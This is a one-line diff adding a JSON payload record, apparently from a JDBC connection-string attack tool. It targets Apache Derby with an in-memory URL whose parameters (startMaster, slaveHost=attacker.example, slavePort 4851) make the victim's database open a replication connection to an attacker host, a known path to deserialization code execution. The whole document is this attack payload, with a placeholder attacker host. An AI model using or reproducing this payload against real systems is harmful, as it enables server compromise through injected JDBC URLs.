@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"derby","driver_class":"org.apache.derby.jdbc.EmbeddedDriver","jdbc_url":"jdbc:derby:memory:test;create=true","url_params":{"startMaster":"true","slaveHost":"attacker.example","slavePort":"4851"},"credentials":{"user":"sa","password":""},"pool":"","pool_config":{},"sql_payload":"","deser_properties":{}}
